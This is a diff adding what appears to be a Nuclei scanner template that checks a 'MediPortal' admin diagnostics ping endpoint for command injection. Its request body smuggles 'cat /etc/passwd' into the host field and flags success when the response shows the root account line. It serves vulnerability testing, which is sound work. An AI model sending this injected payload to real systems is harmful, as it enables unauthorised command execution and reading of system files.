@@ -1,0 +1,25 @@
+id: mediportal-diagnostics-rce
+
+info:
+  name: MediPortal Admin Diagnostics RCE
+  author: edge-resilience-lab
+  severity: critical
+  description: Targeted command injection test for the Admin Diagnostics ping tool.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/diagnostics/ping"
+    headers:
+      Content-Type: application/json
+    body: '{"host": "127.0.0.1; cat /etc/passwd"}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+        part: body
+      - type: status
+        status:
+          - 200
